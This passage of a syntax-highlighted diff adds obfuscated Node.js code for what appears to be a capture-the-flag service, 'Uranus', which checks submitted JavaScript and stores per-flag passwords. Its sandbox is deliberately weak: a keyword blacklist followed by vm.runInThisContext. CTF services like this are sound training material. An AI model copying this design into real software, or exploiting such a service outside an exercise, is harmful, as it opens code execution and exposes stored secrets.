+      <span class="nx">g8</span> <span class="o">=</span> <span class="nx">R8</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">?</span> <span class="nx">G8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">G8</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">:</span> <span class="nx">g8</span> <span class="o">^</span> <span class="nx">G8</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">G8</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">g8</span> <span class="o">?</span> <span class="nx">W8</span> <span class="o">:</span> <span class="o">!</span><span class="nx">W8</span>
+  <span class="p">}};</span>
+<span class="p">})();</span>
+<span class="kd">var</span> <span class="nx">z9o2</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;63&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">{</span><span class="s1">&#39;p2&#39;</span><span class="o">:</span> <span class="s2">&quot;length&quot;</span><span class="p">,</span> <span class="s1">&#39;n2&#39;</span><span class="o">:</span> <span class="s2">&quot;fs&quot;</span><span class="p">,</span> <span class="s1">&#39;w4&#39;</span><span class="o">:</span> <span class="s2">&quot;toString&quot;</span><span class="p">,</span> <span class="s1">&#39;J4&#39;</span><span class="o">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="s1">&#39;v2&#39;</span><span class="o">:</span> <span class="s2">&quot;listen&quot;</span><span class="p">,</span> <span class="s1">&#39;R4&#39;</span><span class="o">:</span> <span class="s2">&quot;log&quot;</span><span class="p">,</span> <span class="s1">&#39;a4&#39;</span><span class="o">:</span> <span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="s1">&#39;d2&#39;</span><span class="o">:</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="s1">&#39;c4&#39;</span><span class="o">:</span> <span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span><span class="p">,</span> <span class="s1">&#39;Q4&#39;</span><span class="o">:</span> <span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;N4&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">,</span> <span class="s1">&#39;W4&#39;</span><span class="o">:</span> <span class="s2">&quot;createServer&quot;</span><span class="p">,</span> <span class="s1">&#39;Q2&#39;</span><span class="o">:</span> <span class="p">{},</span> <span class="s1">&#39;M4&#39;</span><span class="o">:</span> <span class="mi">1337</span><span class="p">,</span> <span class="s1">&#39;t2&#39;</span><span class="o">:</span> <span class="s2">&quot;on&quot;</span><span class="p">,</span> <span class="s1">&#39;s4&#39;</span><span class="o">:</span> <span class="s2">&quot;submissions&quot;</span><span class="p">,</span> <span class="s1">&#39;x2&#39;</span><span class="o">:</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="s1">&#39;y2&#39;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;X2&#39;</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span> <span class="s1">&#39;f2&#39;</span><span class="o">:</span> <span class="s2">&quot;end&quot;</span><span class="p">,</span> <span class="s1">&#39;l2&#39;</span><span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s1">&#39;A4&#39;</span><span class="o">:</span> <span class="s2">&quot;writeHead&quot;</span><span class="p">}</span> <span class="o">:</span> <span class="mi">1337</span><span class="p">;</span>
+<span class="kd">function</span> <span class="nx">handle</span><span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;aa2e&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;You suck\n&#39;</span> <span class="o">:</span> <span class="s1">&#39;Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.&#39;</span><span class="p">,</span> <span class="nx">V</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;f56&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;test&quot;</span> <span class="o">:</span> <span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;a6cf&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;indexOf&quot;</span> <span class="o">:</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;5613&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;method&quot;</span> <span class="o">:</span> <span class="s2">&quot;writeFileSync&quot;</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nx">E</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">s</span><span class="p">](</span><span class="nx">V</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">y2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">b</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
+    <span class="nx">b</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">k</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">makeSandbox</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">delete</span>  <span class="nb">eval</span><span class="p">;</span>
+  <span class="k">delete</span>  <span class="nb">Function</span><span class="p">;</span>
+  <span class="k">delete</span>  <span class="nx">require</span><span class="p">;</span>
+  <span class="k">delete</span>  <span class="nx">fs</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">V</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;81&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;No password found&quot;</span> <span class="o">:</span> <span class="s2">&quot;token&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;c14&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;match&quot;</span> <span class="o">:</span> <span class="s2">&quot;toString&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;5f&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;eval&quot;</span> <span class="o">:</span> <span class="s2">&quot;readFileSync&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;ffb7&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span> <span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">s4</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;fb&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Your code has runtime errors: &#39;</span> <span class="o">:</span> <span class="nx">b</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">J4</span> <span class="o">+</span> <span class="nx">k</span><span class="p">;</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;67cf&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;Code contains unsafe functionality.\n&quot;</span> <span class="o">:</span> <span class="nx">ff</span><span class="p">[</span><span class="nx">c</span><span class="p">](</span><span class="nx">w</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">x2</span> <span class="o">+</span> <span class="nx">z</span><span class="p">)[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">w4</span><span class="p">]();</span>
+    <span class="k">return</span> <span class="nx">O</span><span class="p">[</span><span class="nx">s</span><span class="p">](</span><span class="sr">/password = &quot;([0-9a-zA-Z]{16})&quot;/</span><span class="p">)[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">y2</span><span class="p">];</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nx">V</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;1b&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;k&quot;</span> <span class="o">:</span> <span class="s2">&quot;runInThisContext&quot;</span><span class="p">,</span> <span class="nx">V</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;81e&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;vm&quot;</span> <span class="o">:</span> <span class="s2">&quot;handlePOST&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;74&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">global</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;a11a&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;g&quot;</span> <span class="o">:</span> <span class="nx">E</span><span class="p">;</span>
+  <span class="p">}</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;33c1&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">password</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;77&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;loadSubmission&quot;</span> <span class="o">:</span> <span class="nx">E</span><span class="p">;</span>
+  <span class="p">}</span> <span class="o">:</span> <span class="s2">&quot;submissions&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;d5&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;retval&quot;</span> <span class="o">:</span> <span class="nx">require</span><span class="p">(</span><span class="nx">V</span><span class="p">);</span>
+  <span class="nx">c</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">l2</span><span class="p">);</span>
+  <span class="nx">s</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">l2</span><span class="p">);</span>
+  <span class="nx">w</span><span class="p">[</span><span class="nx">k</span><span class="p">](</span><span class="nx">b</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">w4</span><span class="p">]());</span>
+  <span class="k">return</span> <span class="nx">password</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">V</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;ac&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;handle&quot;</span> <span class="o">:</span> <span class="s2">&quot;writeFileSync&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;3a8&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;mkdirSync&quot;</span> <span class="o">:</span> <span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;6ef&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;statSync&quot;</span> <span class="o">:</span> <span class="s2">&quot;err&quot;</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">s4</span><span class="p">,</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">b</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">J4</span> <span class="o">+</span> <span class="nx">k</span><span class="p">;</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">Z</span> <span class="o">=</span> <span class="nx">ff</span><span class="p">[</span><span class="nx">w</span><span class="p">](</span><span class="nx">z</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Z</span><span class="p">)</span><span class="nx">ff</span><span class="p">[</span><span class="nx">c</span><span class="p">](</span><span class="nx">z</span><span class="p">);</span>
+  <span class="nx">ff</span><span class="p">[</span><span class="nx">s</span><span class="p">](</span><span class="nx">z</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">x2</span> <span class="o">+</span> <span class="nx">O</span><span class="p">,</span> <span class="nx">V</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">checkCode</span><span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;61&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="s2">&quot;res&quot;</span><span class="p">,</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;2f7&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;test&quot;</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">V</span> <span class="o">=</span> <span class="s2">&quot;test&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;3ae&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="mi">30</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mf">96.5E1</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;R&#39;</span> <span class="o">:</span> <span class="p">(</span><span class="mf">105.2E1</span><span class="p">,</span> <span class="mi">44</span><span class="p">.)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">142</span><span class="p">,</span> <span class="mf">1.183E3</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">110</span><span class="p">,</span> <span class="mf">133.70E1</span><span class="p">)</span> <span class="o">:</span> <span class="mi">120</span><span class="p">.</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">53.6E1</span><span class="p">,</span> <span class="mi">96</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x24A</span><span class="p">,</span> <span class="s2">&quot;q&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">8.4E1</span><span class="p">,</span> <span class="mf">1.5E1</span><span class="p">))</span> <span class="o">:</span> <span class="s2">&quot;writeFileSync&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;ba&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="mf">9.99E2</span><span class="p">,</span> <span class="mf">119.80E1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mi">24</span><span class="p">.,</span> <span class="mf">10.96E2</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;\n&#39;</span> <span class="o">:</span> <span class="mi">131</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mh">0x105</span><span class="p">,</span> <span class="mh">0x132</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;\n&#39;</span> <span class="o">:</span> <span class="p">(</span><span class="mf">1.0010E3</span><span class="p">,</span> <span class="mi">72</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">23.90E1</span> <span class="o">?</span> <span class="p">(</span><span class="mi">124</span><span class="p">.,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">100</span><span class="p">.,</span> <span class="mh">0x254</span><span class="p">))</span> <span class="o">:</span> <span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="p">[</span><span class="sr">/eval/</span><span class="p">,</span> <span class="sr">/global/</span><span class="p">,</span> <span class="sr">/Function/</span><span class="p">,</span> <span class="sr">/this/</span><span class="p">];</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">c</span><span class="p">;</span> <span class="nx">A3a</span><span class="p">[</span><span class="nx">s</span><span class="p">](</span><span class="nx">z</span><span class="p">,</span> <span class="nx">w</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">p2</span><span class="p">]);</span> <span class="nx">z</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">w</span><span class="p">[</span><span class="nx">z</span><span class="p">][</span><span class="nx">V</span><span class="p">](</span><span class="nx">E</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">k</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nx">b</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">G</span><span class="p">,</span> <span class="nx">A</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">N</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;e1c&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;data&quot;</span> <span class="o">:</span> <span class="s2">&quot;hasOwnProperty&quot;</span><span class="p">;</span>
+  <span class="nx">G</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">t2</span><span class="p">](</span><span class="nx">N</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">V</span> <span class="o">=</span> <span class="s1">&#39;Your JSON is malformed. Please provide the following properties: flag_id, token, code\n&#39;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="s1">&#39;Code contains unsafe functionality.\n&#39;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;46cf&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is &quot;password&quot;.\n&#39;</span> <span class="o">:</span> <span class="s2">&quot;Received: %s&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;53&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;text/plain&#39;</span> <span class="o">:</span> <span class="s1">&#39;Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n&#39;</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;555&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;U&quot;</span> <span class="o">:</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;8ccd&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;\n&#39;</span> <span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">Z</span> <span class="o">=</span> <span class="s1">&#39;Your password: &#39;</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="s2">&quot;code&quot;</span><span class="p">,</span> <span class="nx">T</span> <span class="o">=</span> <span class="s2">&quot;token&quot;</span><span class="p">,</span> <span class="nx">D</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;2235&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;e&quot;</span> <span class="o">:</span> <span class="s2">&quot;flag_id&quot;</span><span class="p">,</span> <span class="nx">J</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;8f&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;hasOwnProperty&quot;</span> <span class="o">:</span> <span class="s2">&quot;hasOwnProperty&quot;</span><span class="p">,</span> <span class="nx">R</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;2fb&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;patterns&quot;</span> <span class="o">:</span> <span class="s2">&quot;parse&quot;</span><span class="p">;</span>
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="nx">data_json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">[</span><span class="nx">R</span><span class="p">](</span><span class="nx">k</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="nx">data_json</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;265&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">{}</span> <span class="o">:</span> <span class="p">((</span><span class="mh">0x17B</span><span class="p">,</span> <span class="mi">149</span><span class="p">.)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">30</span><span class="p">.,</span> <span class="mh">0x20F</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">12.17E2</span><span class="p">,</span> <span class="s2">&quot;vm&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">7.79E2</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0x1A6</span> <span class="o">?</span> <span class="p">(</span><span class="mf">21.90E1</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">57</span><span class="p">.,</span> <span class="mi">53</span><span class="p">.)</span> <span class="o">&gt;</span> <span class="mf">106.7E1</span> <span class="o">?</span> <span class="p">(</span><span class="mf">7.26E2</span><span class="p">,</span> <span class="mi">84</span><span class="p">.)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">11.61E2</span><span class="p">,</span> <span class="mf">1.5E2</span><span class="p">));</span>
+      <span class="p">};</span>
+      <span class="nx">b</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">J</span><span class="p">](</span><span class="nx">D</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">data_json</span><span class="p">[</span><span class="nx">J</span><span class="p">](</span><span class="nx">T</span><span class="p">))</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">J</span><span class="p">](</span><span class="nx">e</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">old_password</span> <span class="o">=</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">D</span><span class="p">],</span> <span class="nx">data_json</span><span class="p">[</span><span class="nx">T</span><span class="p">]);</span>
+        <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
+        <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">Z</span> <span class="o">+</span> <span class="nx">old_password</span> <span class="o">+</span> <span class="nx">O</span><span class="p">);</span>
+      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">W</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;d6b7&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">code</span> <span class="o">=</span> <span class="nx">E</span><span class="p">[</span><span class="nx">e</span><span class="p">];</span>
+        <span class="p">}</span> <span class="o">:</span> <span class="s2">&quot;No password found&quot;</span><span class="p">,</span> <span class="nx">B</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">password</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;5c78&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;retval&quot;</span> <span class="o">:</span> <span class="nx">E</span><span class="p">;</span>
+        <span class="p">};</span>
+        <span class="nx">B</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">l2</span><span class="p">);</span>
+        <span class="nx">W</span><span class="p">(</span><span class="nx">data_json</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">{</span>
+          <span class="k">try</span> <span class="p">{</span>
+            <span class="nx">retval</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;c4&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;Server running at http://0.0.0.0:1337/&quot;</span> <span class="o">:</span> <span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">w4</span><span class="p">]());</span>
+          <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
